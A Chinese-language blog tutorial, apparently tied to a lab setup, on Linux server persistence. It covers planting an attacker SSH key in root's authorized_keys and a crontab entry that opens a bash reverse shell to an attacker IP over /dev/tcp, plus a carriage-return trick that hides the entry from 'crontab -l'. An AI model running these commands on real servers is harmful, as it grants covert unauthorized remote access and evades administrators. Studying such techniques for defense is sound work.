---
legacyHtml: true
legacySymbols: 2874
title: linux 服务器常见的留后门方式（二）
date: "2022-04-02T15:36:35.000Z"
updated: "2025-01-21T06:58:19.686Z"
tags:
  - Backdoor
  - Linux
  - Kali
categories:
  - CyberSecurity
  - 后门
cover: >-
  https://res.cloudinary.com/sycamore/image/upload/v1682441841/Typera/2023/04/7e00f34b8462535fcbd72b5a18b714e9.png
description: "整理好了搭环境的文章：LINUX 后门复现环境搭建 攻击者在通过各种手段获得服务器的控制权之后，通常会在服务器上布置一些脚本、进程、链接，即所谓的后门。其目的是，方便攻击者以后对该服务器进行持久性的攻击。 其中，在 linux 服务器上留后门的常见技术，本文中会提及如下几种： SSH 公钥免密 crontab 后门 ... # SSH 公钥免密 简而言之，S"
---

<div class="note primary">
<p>整理好了搭环境的文章：<a href="https://blog.sycamore.top/2022/03/21/LINUX%E5%90%8E%E9%97%A8%E5%A4%8D%E7%8E%B0%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">LINUX 后门复现环境搭建</a></p>
</div>
<p>攻击者在通过各种手段获得服务器的控制权之后，通常会在服务器上布置一些脚本、进程、链接，即所谓的<strong>后门</strong>。其目的是，方便攻击者以后对该服务器进行持久性的攻击。</p>
<p>其中，在 linux 服务器上留后门的常见技术，<strong>本文中会提及</strong>如下几种：</p>
<ul>
<li>SSH 公钥免密</li>
<li>crontab 后门<br />
...</li>
</ul>
<h2 id="ssh公钥免密"><a class="anchor" href="#ssh公钥免密">#</a> SSH 公钥免密</h2>
<p>简而言之，<strong>SSH 公钥免密</strong>就是，将<strong>攻击者</strong>生成的 <strong>ssh 公钥</strong>写到<strong>目标服务器</strong>的 <code>/root/.ssh/authorized_keys</code>  中（手动在目标机上完成注册），<br />
然后<strong>攻击者</strong>就可以利用对应的<strong>私钥</strong>免密登录。</p>
<p><strong>实现：</strong></p>
<ol>
<li>
<p>使用 <strong>Xshell</strong> 的 工具 -&gt; 新建用户密钥生成向导，完成<strong> ssh 公钥、私钥</strong>的生成：<img loading="lazy" src="https://res.cloudinary.com/sycamore/image/upload/v1682442537/Typera/2023/04/0c7400e842c42ccbcd324c9147cf6c24.png" alt="image-20230426010853712" /><br />
（填入密码)<br />
&lt;br&gt;</p>
</li>
<li>
<p>保存生成的公钥文件（id_rsa_2048.pub），传到<strong>目标服务器</strong>上，<img loading="lazy" src="https://res.cloudinary.com/sycamore/image/upload/v1682442569/Typera/2023/04/8a2edc41bc3463490d0617bcbbd9acd1.png" alt="image-20230426010925673" /><br />
&lt;br&gt;</p>
</li>
<li>
<p>寻找 <strong>authorized_keys</strong> 文件，命令 <code>find -name authorized_keys</code> ，<br />
如果没有，就通过命令 <code>touch /root/.ssh/authorized_keys</code>  创建。<br />
&lt;br&gt;</p>
</li>
<li>
<p>命令 <code>ssh-keygen -t rsa</code>  开启免密登录功能，<br />
&lt;br&gt;</p>
</li>
<li>
<p>通过命令 <code>cat 公钥路径 &gt;&gt; /root/.ssh/authorized_keys</code>  把公钥写入到<strong> authorized_keys</strong>，完成注册<br />
 &lt;br&gt;</p>
</li>
<li>
<p>修改文件权限 <code>chmod 600 ~/.ssh/authorized_keys</code> <br />
 <code>chmod 700 ~/.ssh</code> <br />
&lt;br&gt;</p>
</li>
<li>
<p>攻击者使用<strong> Xshell</strong> 生成的<strong>私钥</strong>和之前填写的<strong>密码</strong>，登录目标服务器<img loading="lazy" src="https://res.cloudinary.com/sycamore/image/upload/v1682442599/Typera/2023/04/f0b36186750c7e6ae6e0cfb6e31536aa.png" alt="image-20230426010955314" /><img loading="lazy" src="https://res.cloudinary.com/sycamore/image/upload/v1682442619/Typera/2023/04/3707348bcf16ceccd18bb0594ff0933d.png" alt="image-20230426011015095" /></p>
</li>
</ol>
<h2 id="crontab后门"><a class="anchor" href="#crontab后门">#</a> crontab 后门</h2>
<p><strong>Crond</strong> 服务启动后，会<strong>定期</strong>（默认一分钟检查一次）检查它的配置文件中，是否有要执行的任务。<br />
如果有，就会根据<strong>预先设定</strong>的<strong>定时任务规则</strong>自动执行该任务。<br />
crontab 是用来定期执行程序的命令，<br />
我们可以通过<strong> crontab</strong> 命令制造定时后门：<br />
 <code>(crontab -l;echo '*/60 * * * * exec 9&lt;&gt; /dev/tcp/192.168.158.132/2333;exec 0&lt;&amp;9;exec 1&gt;&amp;9 2&gt;&amp;1;/bin/bash --noprofile -i')|crontab -</code></p>
<p><strong>解释：</strong><br />
 <code>echo '*/60 * * * *'</code> ：设定每 60 分钟执行一次；<br />
 <code>exec 9&lt;&gt;/dev/tcp/192.168.158.132/2333</code> ：利用 bash 提供的功能，对 <code>/dev/tcp/</code>  开头的字符串进行<strong>解析</strong>，指定<strong>服务器 IP</strong> 为：192.168.158.132（<strong>攻击机</strong> IP），<strong>端口号</strong>为 2333，指定描述符为 9，建立网络连接；<br />
 <code>exec 0&lt;&amp;9;exec 1&gt;&amp;9 2&gt;&amp;1;</code> ：<strong>文件描述符</strong> 0：stdin，1：stdout，把标准输入输出<strong>都</strong>重定向到描述符 9；<br />
 <code>/bin/bash --noprofile -i</code> ：开一个 Shell。<br />
其实就是利用 Bash <strong>反弹</strong>一个<strong> Shell</strong> 到指定的攻击者 IP</p>
<p>（ubuntu 默认<strong>没开</strong> bash 的网络重定向选项，需要加上 <code>–enable-net-redirections</code>  重新编译 bash）</p>
<p><strong>隐藏：</strong><br />
但是这样的一个后门，管理员直接执行 <code>crontab -l</code>  就能看到我们设定的定时任务。<br />
<img loading="lazy" src="https://res.cloudinary.com/sycamore/image/upload/v1682442659/Typera/2023/04/e8f07ae16e6573488c17eeea6f3339f2.png" alt="image-20230426011055514" /><br />
 这个命令其实是在读取  <code>/var/spool/cron/crontabs/root</code>  文件。<br />
所以，我们可以利用 cat 的一个缺陷，使用一些<strong>转义字符</strong>，比如 \r 回车符 \n 换行符 \f 换页符，来<strong>隐藏</strong>我们不想让管理员看到的命令：<br />
 <code>(crontab -l;printf &quot;*/60 * * * * exec 9&lt;&gt; /dev/tcp/192.168.158.132/2333;exec 0&lt;&amp;9;exec 1&gt;&amp;9 2&gt;&amp;1;/bin/bash --noprofile -i;\rno crontab for </code> whoami <code>%100c\n&quot;)|crontab -</code> <br />
<img loading="lazy" src="https://res.cloudinary.com/sycamore/image/upload/v1682442674/Typera/2023/04/0af7f80743588f2bae6b80f3903e55c6.png" alt="image-20230426011110789" /> 但是，若是使用 <code>cat -A /var/spool/cron/crontabs/root</code>  还是可以看到我们隐藏的东西的。</p>
